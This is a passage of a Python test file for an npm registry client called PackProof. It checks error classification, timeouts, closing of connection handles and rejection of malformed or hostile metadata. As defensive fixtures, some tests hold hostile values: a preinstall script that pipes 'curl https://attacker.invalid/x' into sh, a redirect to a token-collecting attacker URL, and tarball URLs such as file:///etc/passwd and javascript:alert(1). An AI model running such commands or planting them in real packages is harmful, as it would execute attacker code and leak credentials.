    same category as any other unreadable body — a registry that answers in an unexpected
    encoding is not a bug in PackProof."""
    with pytest.raises(RegistryNotJSONError, match="UnicodeDecodeError"):
        _fetch_body(b'{"name": "express", "x": "\xff\xfe"}')


def test_a_deeply_nested_body_is_refused_and_never_becomes_metadata() -> None:
    """The property is that a hostile document arrives neither as metadata nor as a crash, and
    which named category answers it is a fact about CPython's parser rather than about PackProof.
    Measured on this repository: 3.11.15, 3.12.13 and 3.13.6 give up part-way down these 40 000
    characters and the client's `except` clause labels that `RegistryNotJSONError`; 3.14.4 parses
    the same bytes into a list, and the shape check every document passes through refuses it as
    `RegistryMetadataError`. Neither route accepts anything.

    Naming one class would therefore pin an interpreter, so this pins their shared parent and then
    that the raised object is one of exactly the two leaves of it. Raising the parent itself, or
    letting a bare `RecursionError` or `ValueError` escape, fails here. The other route is covered
    deterministically below, on every interpreter, by injecting the parser's failure.
    """
    deep = ("[" * 20_000 + "]" * 20_000).encode("ascii")

    with pytest.raises(RegistryInvalidResponseError) as excinfo:
        _fetch_body(deep, max_metadata_bytes=1_000_000)

    assert type(excinfo.value) in (RegistryNotJSONError, RegistryMetadataError)
    message = str(excinfo.value)
    assert message.isascii()
    # Both refusals describe the answer — its shape, or the parse failure and the byte count.
    # Neither reproduces the body, which here is 40 000 bracket characters and would flood
    # whatever report the error landed in.
    assert "[" not in message
    assert "express" in message


def test_a_recursion_error_while_parsing_is_classified_by_the_client(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The parse-exhaustion route, forced. `RecursionError` inherits from `Exception` and not from
    `ValueError`, so a client that caught only `JSONDecodeError` and `UnicodeDecodeError` would
    let a stack-exhausting document surface as a traceback instead of as a named refusal.

    Whether the parser actually reaches its limit at a given depth is the interpreter's business,
    which is exactly why this does not depend on it: the failure is injected at the call the client
    makes, and what is under test is the clause in `npm_fetcher`, not the parser. This is the one
    place in this file that patches `json.loads`, and it patches it to *fail* rather than to supply
    a document, so the bounded read, the truncation check and the chunk loop all still run for real
    on the way to the injection.
    """

    def refuse_to_recurse(*args: object, **kwargs: object) -> None:
        raise RecursionError("simulated parser exhaustion")

    monkeypatch.setattr(npm_fetcher.json, "loads", refuse_to_recurse)

    with pytest.raises(RegistryNotJSONError, match="RecursionError while parsing") as excinfo:
        _fetch_body(b'{"name": "express"}')

    assert isinstance(excinfo.value.__cause__, RecursionError)
    assert str(excinfo.value).isascii()


@pytest.mark.parametrize("document", [None, 42, "express", [1, 2], True])
def test_a_json_value_that_is_not_an_object_is_refused_as_the_wrong_shape(document: object) -> None:
    with pytest.raises(RegistryMetadataError, match="not a JSON object"):
        _fetch_body(_document_bytes(document))


def test_a_missing_package_is_not_a_version_that_does_not_exist() -> None:
    """A 404 is read as *no package by that name* because this client only ever asks for a
    package. That inference is the whole reason one request can tell the two apart."""
    opener = StubOpener(
        urllib.error.HTTPError(
            f"https://{NPM_REGISTRY_HOST}/left-pad", 404, "Not Found", {}, io.BytesIO(b"")
        )
    )

    with pytest.raises(PackageNotFoundError, match="npm has no package named left-pad") as excinfo:
        _client(opener).fetch_version_metadata(parse_npm_reference("left-pad@1.3.0"))

    # The number is in the sentence and nowhere else: `PackageNotFoundError` *is* the 404 for
    # this request shape, so a `status_code` attribute would only invite a caller to branch on
    # a field that can never disagree with the class it is attached to.
    assert not hasattr(excinfo.value, "status_code")
    assert "HTTP 404" in str(excinfo.value)
    assert len(opener.requests) == 1


def test_a_version_that_was_never_published_is_named_with_the_ones_that_were() -> None:
    """The document arrived and parsed; only this release is missing. The count is the useful
    part — it says the package is real and the version is not, which is a different thing to
    hear than "npm is down"."""
    document = _packument("express", "4.17.1", "4.18.2")

    with pytest.raises(VersionNotFoundError) as excinfo:
        _fetch_body(_document_bytes(document), reference="express@9.9.9")

    assert "npm has no version '9.9.9' of express" in str(excinfo.value)
    assert "2 published version(s)" in str(excinfo.value)


def test_a_package_document_with_no_versions_at_all_is_a_version_not_found() -> None:
    with pytest.raises(VersionNotFoundError, match="0 published version"):
        _fetch_body(_document_bytes(_packument("express")))


@pytest.mark.parametrize(
    ("status", "category"),
    [
        (400, RegistryHTTPError),
        (401, RegistryHTTPError),
        (403, RegistryHTTPError),
        (408, RegistryHTTPError),
        (429, RegistryHTTPError),
        (500, RegistryHTTPError),
        (503, RegistryHTTPError),
    ],
)
def test_a_registry_status_error_becomes_the_named_category(status: int, category: type) -> None:
    """No retry, no backoff, no rewriting a 429 into a network failure: the status *is* the
    diagnosis, and it travels as a number a caller can branch on rather than text to match."""
    opener = StubOpener(
        urllib.error.HTTPError(
            f"https://{NPM_REGISTRY_HOST}/express",
            status,
            "Server Error",
            {},
            io.BytesIO(b"registry internals: secret-token=abc123"),
        )
    )

    with pytest.raises(category) as excinfo:
        _client(opener).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert excinfo.value.status_code == status
    assert f"HTTP {status}" in str(excinfo.value)
    assert "secret-token" not in str(excinfo.value)


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
def test_a_redirect_status_is_its_own_category_and_names_no_target(status: int) -> None:
    """A `Location` header is a URL supplied *inside* a response. Refusing to follow it is the
    requirement; refusing to print it is the same requirement seen from the reader's side,
    because a printed target is a target someone will paste into a browser."""
    opener = StubOpener(
        urllib.error.HTTPError(
            f"https://{NPM_REGISTRY_HOST}/express",
            status,
            "Moved",
            {"Location": "https://attacker.invalid/collect?token=1"},
            io.BytesIO(b""),
        )
    )

    with pytest.raises(RegistryRedirectError) as excinfo:
        _client(opener).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert excinfo.value.status_code == status
    assert "attacker.invalid" not in str(excinfo.value)
    assert len(opener.requests) == 1


def test_a_non_200_response_object_is_refused_without_reading_its_body() -> None:
    """The belt-and-braces path: `urllib` raises for a non-2xx, but the injected seam is a
    contract, and a transport that hands back a 204 or a 500 as an object still gets refused by
    status before a byte of it is buffered."""
    response = StubResponse(status=500, body=b"secret registry internals")

    with pytest.raises(RegistryHTTPError, match="HTTP 500") as excinfo:
        _client(StubOpener(response)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert excinfo.value.status_code == 500
    assert response.read_sizes == []
    assert "secret" not in str(excinfo.value)


# --------------------------------------------------------------------------- transport failures


def test_a_connection_failure_is_named_by_class_and_nothing_else() -> None:
    """The exception's own text can carry a host, a proxy, a certificate path or a local
    filename. A registry error has no business reporting facts about this machine, so only the
    class name crosses."""
    reason = OSError(13, "Permission denied", "/Users/operator/.npmrc")
    opener = StubOpener(urllib.error.URLError(reason))

    with pytest.raises(RegistryNetworkError) as excinfo:
        _client(opener).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert "PermissionError" in str(excinfo.value)
    assert ".npmrc" not in str(excinfo.value)
    assert "Permission denied" not in str(excinfo.value)


def test_the_underlying_failure_is_chained_for_a_debugger_but_not_for_a_terminal() -> None:
    """`raise ... from` keeps the cause for whoever reads a traceback with a log level turned
    up, while the message a user sees stays free of it. Swallowing the cause outright would
    make a real diagnosis impossible; printing it would leak."""
    cause = urllib.error.URLError(OSError(111, "Connection refused"))
    opener = StubOpener(cause)

    with pytest.raises(RegistryNetworkError) as excinfo:
        _client(opener).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert excinfo.value.__cause__ is cause


@pytest.mark.parametrize(
    "failure",
    [
        TimeoutError("timed out"),
        urllib.error.URLError(TimeoutError("timed out")),
    ],
)
def test_a_timeout_before_a_body_is_a_timeout_named_with_the_configured_limit(
    failure: Exception,
) -> None:
    """Not a network failure: an operator who set 7.5 seconds needs to be told the number they
    set, because that is the thing they can change."""
    with pytest.raises(RegistryTimeoutError, match="within 7.5 seconds"):
        _client(StubOpener(failure), timeout_seconds=7.5).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


def test_socket_timeout_is_timeout_error_so_one_clause_covers_both_spellings() -> None:
    """The reason a single `except TimeoutError` is enough: since Python 3.10 the two names bind
    the same class, so a `socket.timeout` raised by a blocked read is caught as a timeout."""
    assert socket.timeout is TimeoutError


def test_an_oserror_that_only_says_timed_out_is_a_network_failure_not_a_timeout() -> None:
    """The number decides, not the sentence. This is a reset carrying the words "Connection timed
    out" in its strerror, and the errno is named rather than written as a literal on purpose: a
    bare `110` is ETIMEDOUT on Linux and means nothing on macOS, so a literal here would make the
    same test assert opposite things on the two platforms this project runs CI on."""
    reset = OSError(errno.ECONNRESET, "Connection timed out")

    with pytest.raises(RegistryNetworkError, match="ConnectionResetError") as excinfo:
        _client(StubOpener(reset)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert "timed out" not in str(excinfo.value)


def test_python_turns_the_timeout_number_into_a_timeout_error_so_the_number_is_read_first() -> None:
    """The fact the classification rests on, asserted instead of assumed. An `OSError` constructed
    with `errno.ETIMEDOUT` *is* a `TimeoutError` — the same class a blocked socket raises when
    `PACKPROOF_HTTP_TIMEOUT_SECONDS` expires — so the class alone cannot tell the kernel's verdict
    about a connection from this process's own deadline. The number can: a stall against the
    configured timeout carries no errno at all."""
    kernel_timeout = OSError(errno.ETIMEDOUT, os.strerror(errno.ETIMEDOUT))

    assert isinstance(kernel_timeout, TimeoutError)
    assert kernel_timeout.errno == errno.ETIMEDOUT
    assert TimeoutError("stalled").errno is None


def test_an_os_connect_timeout_is_a_timeout_named_as_a_connection() -> None:
    """`URLError(OSError(errno.ETIMEDOUT, …))` is the shape a connect timeout reaches this client
    in. It is a timeout — a peer was found and did not answer — and it is not the configured limit,
    so the message names the connection and leaves the number out. Saying "within 7.5 seconds"
    would send an operator to change a setting that was never the reason, and a scan that retried
    on that advice would retry the same dead route."""
    cause = urllib.error.URLError(OSError(errno.ETIMEDOUT, os.strerror(errno.ETIMEDOUT)))

    with pytest.raises(RegistryTimeoutError) as excinfo:
        _client(StubOpener(cause), timeout_seconds=7.5).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )

    assert excinfo.value.__cause__ is cause
    assert "timed out" in str(excinfo.value)
    assert "7.5" not in str(excinfo.value)
    assert str(excinfo.value).isascii()


def test_an_exception_carrying_the_timeout_number_is_a_timeout_whatever_its_class() -> None:
    """The number, not the class. Setting `errno` after construction gives a plain `OSError` with
    the timeout number in it, which is how an error that travelled through another process or a
    copied exception arrives; branching on the class alone would call that a network failure and
    make the category depend on how the exception happened to be built."""
    raw = OSError(errno.ENAMETOOLONG, "a name that is too long")
    raw.errno = errno.ETIMEDOUT

    assert not isinstance(raw, TimeoutError)

    with pytest.raises(RegistryTimeoutError):
        _client(StubOpener(urllib.error.URLError(raw))).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


@pytest.mark.parametrize(
    "code",
    [errno.ECONNRESET, errno.ECONNREFUSED, errno.EHOSTUNREACH, errno.ENETUNREACH],
)
def test_an_ordinary_connection_error_borrowing_the_words_timed_out_stays_a_network_failure(
    code: int,
) -> None:
    """Four failures a longer timeout would not improve, each handed the strerror of a timeout to
    prove the text is never consulted. The assertion that none of these *is* the timeout number is
    what keeps the test honest on a platform whose numbers differ from this one."""
    assert code != errno.ETIMEDOUT
    reason = OSError(code, "Connection timed out")

    with pytest.raises(RegistryNetworkError) as excinfo:
        _client(StubOpener(urllib.error.URLError(reason))).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )

    assert not isinstance(excinfo.value, RegistryTimeoutError)
    assert "timed out" not in str(excinfo.value)


def test_a_stall_against_the_configured_limit_keeps_the_number_an_operator_can_change() -> None:
    """The other half of the split, and the behavior this correction had to leave alone: the object
    a blocked socket raises carries no errno, so the only deadline in sight is the configured one
    and naming it is the useful sentence. Written as `socket.timeout` rather than `TimeoutError`
    on purpose, because that is the name the transport uses; ruff's UP041 calls the alias redundant
    and it is right about the class — this test is about the spelling a real stall arrives with."""
    stall: Exception = socket.timeout("timed out")  # noqa: UP041  (deliberate alias, see above)

    with pytest.raises(RegistryTimeoutError, match="within 7.5 seconds"):
        _client(
            StubOpener(urllib.error.URLError(stall)), timeout_seconds=7.5
        ).fetch_version_metadata(parse_npm_reference("express@4.18.2"))


def test_the_errno_rule_applies_to_the_connection_and_not_to_a_stalled_body() -> None:
    """A boundary, written down. The read loop classifies what it catches by class — a
    `TimeoutError` mid-body is the configured limit, anything else is a network failure — because a
    response that started arriving and stopped is a different event from a connection that never
    opened. Changing that is not part of this correction, so the distinction is pinned here rather
    than left to be discovered."""
    response = _FailingStream(body=[b'{"name": "express",' * 8, OSError(errno.ETIMEDOUT, "gone")])

    with pytest.raises(RegistryTimeoutError, match="within 30 seconds"):
        _client(StubOpener(response), timeout_seconds=30.0).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


def test_a_timeout_while_the_body_is_arriving_is_still_a_timeout() -> None:
    """The stall can happen mid-stream, after the headers were fine. The read loop is where a
    socket actually blocks, so the mapping has to exist there too and not only around `open`."""
    response = _FailingStream(body=[b'{"name": "express",' * 8, TimeoutError("stalled")])

    with pytest.raises(RegistryTimeoutError, match="within 30 seconds"):
        _client(StubOpener(response), timeout_seconds=30.0).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


def test_a_connection_reset_mid_body_is_a_network_failure_not_a_truncated_one() -> None:
    """A reset is not "the registry sent a short response": there is no declaration to compare
    against, and the reason text — which can name a peer — is not repeated."""
    response = _FailingStream(
        body=[b'{"name": "express",' * 8, http.client.RemoteDisconnected("reset")]
    )

    with pytest.raises(RegistryNetworkError, match="RemoteDisconnected") as excinfo:
        _client(StubOpener(response)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert "reset" not in str(excinfo.value)


def test_a_malformed_status_line_is_a_network_failure() -> None:
    """`http.client.HTTPException` is not an `OSError`, so it needs its own clause — and a
    response that cannot be read at all is the same category as a socket that will not open."""
    with pytest.raises(RegistryNetworkError, match="BadStatusLine"):
        _client(StubOpener(http.client.BadStatusLine("garbage"))).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


def test_a_registry_error_from_the_transport_is_never_rewrapped() -> None:
    """The redirect handler raises from *inside* the transport, mid-call. Re-wrapping it as a
    network failure would lose the status code it carries, so `except RegistryError: raise` sits
    ahead of the `OSError` clauses — and this proves it does not swallow anything, because
    `RegistryError` is not an `OSError`."""
    raised = RegistryTimeoutError("already the right category")

    with pytest.raises(RegistryTimeoutError) as excinfo:
        _client(StubOpener(raised)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert excinfo.value is raised


def test_the_response_is_closed_on_every_path() -> None:
    """A leaked response is a leaked connection. `finally` covers success, a size refusal, a
    parse failure and a validation failure alike, so this asserts all four in one place."""
    document = _packument("express", "4.18.2")
    success = _response(document)
    _client(StubOpener(success)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))
    assert success.closed

    cases = [
        ("an absent version", _response(document), "express@9.9.9", _CEILING, VersionNotFoundError),
        (
            "unreadable JSON",
            _raw_response(b"plain text"),
            "express@4.18.2",
            _CEILING,
            RegistryNotJSONError,
        ),
        (
            "a document over the ceiling",
            _response(document),
            "express@4.18.2",
            1,
            RegistryResponseTooLargeError,
        ),
    ]

    for description, response, reference, ceiling, category in cases:
        with pytest.raises(category):
            _client(StubOpener(response), max_metadata_bytes=ceiling).fetch_version_metadata(
                parse_npm_reference(reference)
            )
        assert response.closed, description


# --------------------------------------------------------------------------- the error handle


def test_a_404_arriving_as_an_httperror_has_its_handle_closed() -> None:
    """The leak this correction exists for. `urllib` raises `HTTPError` for a non-2xx and its
    opener has no cleanup path, so the response object the error carries — a real socket-backed
    buffer in production — is nothing's responsibility unless the raising code releases it. A scan
    of a thousand unpublished packages would otherwise hold a thousand connections open until the
    garbage collector noticed, and `fetch_version_metadata`'s `finally` cannot help: the response
    was never returned to it."""
    handle = CountingHandle(b'{"error": "Not found", "reason": "no such package"}')
    raised, error = _expect_http_error(404, handle)

    assert isinstance(raised, PackageNotFoundError)
    assert not isinstance(raised, RegistryHTTPError)
    assert not hasattr(raised, "status_code")
    assert raised.__cause__ is error
    assert handle.close_calls == 1
    assert handle.closed


@pytest.mark.parametrize("status", [400, 401, 403, 408, 429, 500, 503])
def test_a_non_404_error_response_is_closed_and_keeps_its_status_number(status: int) -> None:
    """Every other status takes the same route out of `_open`, so the handle has to be released on
    each of them and not only on the one that happens to be common. The category and the number are
    asserted in the same breath: closing a handle must not cost the caller the diagnosis, which is
    the whole reason `_close_handle` returns nothing and cannot replace the exception."""
    handle = CountingHandle(b"registry internals")
    raised, error = _expect_http_error(status, handle)

    assert type(raised) is RegistryHTTPError
    assert raised.status_code == status
    assert f"HTTP {status}" in str(raised)
    assert raised.__cause__ is error
    assert handle.close_calls == 1


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
def test_a_redirect_arriving_as_an_httperror_is_closed_and_names_no_target(status: int) -> None:
    """A 3xx refused by status is a redirect *object* holding a `Location` header and a body.
    Releasing it is the same cleanup as any other error; naming its reason phrase or its target
    would be the leak on the message side, so both halves are asserted here."""
    handle = CountingHandle(b"moved permanently")
    raised, _ = _expect_http_error(status, handle)

    assert isinstance(raised, RegistryRedirectError)
    assert raised.status_code == status
    assert handle.close_calls == 1
    assert "Reason Phrase" not in str(raised)
    assert "Location" not in str(raised)


def test_a_handle_the_transport_already_closed_is_not_closed_again() -> None:
    """The requirement to not double-close, made observable. A real file object does not report how
    many times it was closed, and a second `close()` is harmless — which is precisely why the guard
    in `_close_handle` needs a counter to prove it is there: `urllib`'s own finalizer can also
    close the handle at collection time, and a client that closed blindly would be relying on that
    idempotence rather than declining to participate."""
    handle = CountingHandle(b"already finished")
    handle.close()
    assert handle.close_calls == 1

    raised, _ = _expect_http_error(503, handle)

    assert isinstance(raised, RegistryHTTPError)
    assert raised.status_code == 503
    assert handle.close_calls == 1


def test_an_httperror_carrying_no_handle_is_still_classified() -> None:
    """`fp` is None in the `HTTPError` objects other code raises on the transport's behalf — and
    "release whatever it is holding" has to tolerate holding nothing instead of turning a clean 500
    into an `AttributeError` on the way out. A missing handle is not a missing status code."""
    handle: io.BytesIO = io.BytesIO(b"")
    error = _http_error(500, handle)
    error.fp = None

    with pytest.raises(RegistryHTTPError) as excinfo:
        _client(StubOpener(error)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert excinfo.value.status_code == 500
    assert excinfo.value.__cause__ is error


def test_a_close_that_fails_does_not_replace_the_status_code() -> None:
    """Cleanup errors are swallowed for a reason: the registry said 503, and an `OSError` about a
    file descriptor says nothing about the registry while hiding the one number a caller can branch
    on. The suppressed failure stays on the discarded handle, not in the raised error."""
    handle = UncloseableHandle(b"registry internals")
    raised, error = _expect_http_error(503, handle)

    assert type(raised) is RegistryHTTPError
    assert raised.status_code == 503
    assert "Bad file descriptor" not in str(raised)
    assert raised.__cause__ is error
    assert handle.close_attempts == 1


@pytest.mark.parametrize("status", [404, 429, 500])
def test_an_error_response_body_is_neither_read_nor_logged(
    status: int, caplog: pytest.LogCaptureFixture
) -> None:
    """Two halves of one rule, and the read half needs the fixture rather than a string check: a
    client that buffered an error body in order to look for the marker would satisfy `marker not in
    message` while having done the forbidden thing. `UnreadableHandle` raises on any read, so
    reaching the assertions at all is the proof — and the log half is that an error path adds
    nothing to the debug stream beyond the request line this client wrote before sending."""
    marker = "ERROR-BODY-TEXT-THAT-MUST-NOT-APPEAR"
    handle = UnreadableHandle(marker.encode("ascii"))

    with caplog.at_level(logging.DEBUG, logger="packproof.registry.npm_fetcher"):
        raised, _ = _expect_http_error(status, handle)

    assert handle.closed
    assert marker not in str(raised)
    assert "Reason Phrase" not in str(raised)
    assert [record.getMessage() for record in caplog.records] == [
        "npm metadata request for express@4.18.2"
    ]
    assert all(record.getMessage().isascii() for record in caplog.records)


# --------------------------------------------------------------------------- unexpected shapes


@pytest.mark.parametrize(
    ("versions", "reason"),
    [
        ([], "not an object"),
        ("4.18.2", "not an object"),
        ({"4.18.2": []}, "not an object"),
        ({"4.18.2": "a string"}, "not an object"),
        ({"4.18.2": None}, "not an object"),
    ],
)
def test_a_versions_field_that_is_not_the_shape_npm_uses_is_refused(
    versions: object, reason: str
) -> None:
    """npm's `versions` is a map of version → entry. A registry that answers with a list would
    make "which release is this" unanswerable, and guessing from position is how the wrong
    digests get attached to the right name."""
    document = _packument("express", "4.18.2")
    document["versions"] = versions

    with pytest.raises(RegistryMetadataError, match=reason):
        _fetch_body(_document_bytes(document))


@pytest.mark.parametrize(
    ("dist", "reason"),
    [
        ("https://registry.npmjs.org/e/-/e.tgz", "not an object"),
        (None, "not an object"),
        ([], "not an object"),
        ({}, "Field required"),
        ({"tarball": None}, "valid string"),
        ({"tarball": 5}, "valid string"),
        ({"tarball": "https://good.test/x.tgz", "integrity": "md5-9ed3dbe"}, "dist.integrity"),
        ({"tarball": "https://good.test/x.tgz", "shasum": "A" * 40}, "lowercase hex"),
        ({"tarball": "https://good.test/x.tgz", "integrity": "sha512-"}, "dist.integrity"),
    ],
)
def test_a_dist_block_that_cannot_be_read_is_a_failure_not_a_gap(dist: object, reason: str) -> None:
    """Absent and unusable stay different all the way through. `dist` missing entirely is a
    refusal, not a record with `distribution=None`, because every later stage starts from the
    artifact this block names."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["dist"] = dist

    with pytest.raises(RegistryMetadataError, match=reason):
        _fetch_body(_document_bytes(document))


@pytest.mark.parametrize("description", [42, True, ["a", "list"], {"nested": "object"}])
def test_a_description_of_the_wrong_type_is_refused_rather_than_stringified(description) -> None:
    """Strict mode is what makes this a refusal. A `str()` of a registry value would put
    `{'nested': 'object'}` into a report line as though the package had described itself that
    way."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["description"] = description

    with pytest.raises(RegistryMetadataError, match="valid string"):
        _fetch_body(_document_bytes(document))


@pytest.mark.parametrize("repository", [42, ["a", "b"], {"url": 42}, {}, "x" * 5_000])
def test_a_repository_that_is_neither_npm_spelling_is_refused(repository: object) -> None:
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["repository"] = repository

    with pytest.raises(RegistryMetadataError):
        _fetch_body(_document_bytes(document))


def test_a_repository_object_carries_only_the_three_fields_npm_defines() -> None:
    """`branch`, `path` and anything else a publisher invents are not copied into the model, and
    `extra="forbid"` means a key the projection *claims* to map but the registry never sends is
    caught here rather than surfacing as a silently missing value."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["repository"] = {
        "type": "git",
        "url": "https://github.com/example/express.git",
        "branch": "main",
        "directory": "packages/express",
        "hint": "trust me",
    }

    metadata, _ = _fetch(document)

    assert metadata.repository is not None
    assert set(metadata.repository.model_dump()) == {"url", "kind", "directory"}
    assert metadata.repository.kind == "git"


def test_a_document_about_a_different_package_than_the_one_asked_for_is_refused() -> None:
    """A response whose `name` disagrees with the request is not an answer to the question, and
    every field in it describes someone else's artifact."""
    document = _packument("left-pad", "1.3.0")

    with pytest.raises(RegistryMetadataError) as excinfo:
        _fetch_body(_document_bytes(document), reference="express@4.18.2")

    assert "describes 'left-pad' instead" in str(excinfo.value)


def test_an_entry_filed_under_a_version_that_it_does_not_describe_is_refused() -> None:
    """The one that matters most: an entry sitting under `4.18.2` while its own `version` says
    `4.17.1` carries *real* digests for the wrong bytes. Accepted quietly, every later stage
    would verify the wrong tarball and report the result about this one."""
    for key, other in (("version", "4.17.1"), ("name", "other-package")):
        document = _packument("express", "4.18.2")
        document["versions"]["4.18.2"][key] = other

        with pytest.raises(RegistryMetadataError, match="carries a different") as excinfo:
            _fetch_body(_document_bytes(document))

        assert message_is_ascii_and_short(str(excinfo.value))


def test_a_time_map_that_is_not_an_object_is_refused() -> None:
    document = _packument("express", "4.18.2")
    document["time"] = "2022-10-08T20:14:32.495Z"

    with pytest.raises(RegistryMetadataError, match="time"):
        _fetch_body(_document_bytes(document))


def test_a_timestamp_the_model_cannot_turn_into_an_instant_is_a_refusal() -> None:
    """`published_at` is used to order releases, so a naive or nonsense value is worse than a
    missing one: it would be compared against a different clock every time."""
    for published_at in ("not a time", "2022-10-08T20:14:32", 1665260072, True):
        document = _packument("express", "4.18.2")
        document["time"]["4.18.2"] = published_at

        with pytest.raises(RegistryMetadataError):
            _fetch_body(_document_bytes(document))


def test_a_validation_refusal_names_fields_and_not_the_value_that_broke_them() -> None:
    """`str(ValidationError)` embeds pydantic's repr of the input, which is registry content of
    unknown size and encoding. The message here is field paths and reasons, escaped, and carries
    none of the bytes that arrived."""
    hostile = "\u00e9" * 4_000 + "\x1b[2J"
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["description"] = hostile

    with pytest.raises(RegistryMetadataError) as excinfo:
        _fetch_body(_document_bytes(document))

    message = str(excinfo.value)
    assert "description" in message
    assert message.isascii()
    assert "\u00e9" not in message
    assert "\x1b" not in message
    assert len(message) < 1_000


# --------------------------------------------------------------------------- URLs inside metadata


@pytest.mark.parametrize(
    "tarball",
    [
        "https://attacker.invalid/express/-/express-4.18.2.tgz",
        "https://registry.npmjs.org/express/-/express-4.18.2.tgz?token=1",
        "https://registry.npmjs.org/../../etc/passwd",
        "https://registry.npmjs.org.evil.invalid/express/-/e.tgz",
    ],
)
def test_a_tarball_url_is_validated_as_text_and_never_reached(tarball: str) -> None:
    """Stage 2.2 records where the artifact is; it does not go there.

    These four are all *well-formed HTTPS* and all suspicious: another host, a query an operator
    did not configure, a traversal-shaped path, and a label that looks like the registry but is a
    subdomain of something else. None of them is refused here, because this field is data about an
    artifact rather than permission to fetch it — and the assertion that matters is the same for
    all four: exactly one request was made, and it was the packument."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["dist"]["tarball"] = tarball
    expected = npm_package_url("express")

    metadata, opener = _fetch(document)

    assert len(opener.requests) == 1
    assert opener.urls == [expected]
    assert metadata.distribution.tarball_url == tarball


@pytest.mark.parametrize(
    "tarball",
    [
        "http://registry.npmjs.org/express/-/express-4.18.2.tgz",
        "ftp://registry.npmjs.org/express/-/express-4.18.2.tgz",
        "file:///etc/passwd",
        "https://registry.npmjs.org/express/-/express-4.18.2.tgz#chunk",
        "https://user:pass@registry.npmjs.org/express/-/e.tgz",
        "/express/-/express-4.18.2.tgz",
        "javascript:alert(1)",
        "https:///e.tgz",
        "https://registry.npmjs.org/e /-/e.tgz",
        "",
    ],
)
def test_a_download_target_that_could_not_be_used_safely_is_refused_before_it_is_stored(
    tarball: str,
) -> None:
    """Each spelling means something different to whatever downloads this later, so none of them
    is stored: a credential nobody configured, a fragment an HTTP client drops, a relative path
    with no host to resolve it against, a scheme that is not HTTPS at all."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["dist"]["tarball"] = tarball

    with pytest.raises(RegistryMetadataError, match="dist.tarball"):
        _fetch_body(_document_bytes(document))


def test_a_hostile_repository_is_kept_as_evidence_and_not_visited() -> None:
    """`repository.url` is the claim a later stage checks, not a place PackProof goes. Storing it
    unchanged is the point: rewriting or dropping it would be PackProof editing the assertion it
    has yet to test."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["repository"] = {
        "type": "git",
        "url": "git+https://attacker.invalid/express",
    }

    metadata, opener = _fetch(document)

    assert metadata.repository is not None
    assert metadata.repository.url == "git+https://attacker.invalid/express"
    assert opener.urls == [npm_package_url("express")]


def test_a_publishers_build_script_is_never_read_into_the_record() -> None:
    """`scripts.preinstall` is the classic remote-code path, and a packument full of it is still
    just JSON here: no field of the record can hold it, and nothing in this stage runs a
    package's own hooks."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["scripts"]["preinstall"] = "curl https://attacker.invalid/x|sh"

    metadata, _ = _fetch(document)

    assert "preinstall" not in str(metadata.model_dump())


# --------------------------------------------------------------------------- one request only


def test_two_references_are_two_requests_and_never_a_request_to_a_tarball() -> None:
    """The client is reusable, and every URL it produces comes from `npm_package_url`: nothing in
    the code path can turn a registry *field* into a registry *request*."""
    opener = StubOpener(
        _response(_packument("express", "4.18.2")),
        _response(_packument("@babel/core", "7.24.0")),
    )
    client = _client(opener)

    client.fetch_version_metadata(parse_npm_reference("express@4.18.2"))
    client.fetch_version_metadata(parse_npm_reference("@babel/core@7.24.0"))

    assert opener.urls == [
        npm_package_url("express"),
        npm_package_url("@babel/core"),
    ]
    assert all("/-/" not in url for url in opener.urls)


def test_the_module_contains_one_request_construction_and_no_download_limit() -> None:
    """A structural check on the stage boundary, because "we do not download tarballs yet" is
    only true if nothing in the file asks for one. The client builds exactly one `Request`, never
    calls `urlretrieve` or opens an archive, and does not read the archive-size setting that
    belongs to a later stage."""
    text = Path(inspect.getsourcefile(NpmRegistryClient)).read_text(encoding="utf-8")

    assert text.count("urllib.request.Request(") == 1
    for forbidden in ("urlretrieve", "max_download_bytes", "tarfile", "zipfile", "shutil"):
        assert forbidden not in text, forbidden


def test_the_default_opener_installs_the_redirect_refusal() -> None:
    """`build_opener` replaces the default `HTTPRedirectHandler` with the subclass, so the
    standard-library behaviour that would follow a `Location` header is gone from the transport
    this client actually uses."""
    director = _default_opener().__closure__[0].cell_contents
    handlers = director.handlers

    assert sum(isinstance(handler, _RefuseRedirectHandler) for handler in handlers) == 1
    assert not any(type(handler) is urllib.request.HTTPRedirectHandler for handler in handlers)


def test_the_default_opener_passes_the_timeout_as_a_timeout_not_as_a_request_body() -> None:
    """`urlopen(request, 30)` binds 30 to `data`, which turns the GET into a POST. The seam this
    module exposes takes the number as its second argument, so the keyword binding has to happen
    inside the closure — and this is the test that says it did."""
    closure = _default_opener()
    director = closure.__closure__[0].cell_contents
    seen: dict[str, object] = {}

    def fake_open(request: urllib.request.Request, *, timeout: float) -> str:
        seen["request"] = request
        seen["timeout"] = timeout
        return "answered"

    director.open = fake_open  # type: ignore[method-assign]
    request = _request(f"https://{NPM_REGISTRY_HOST}/express")

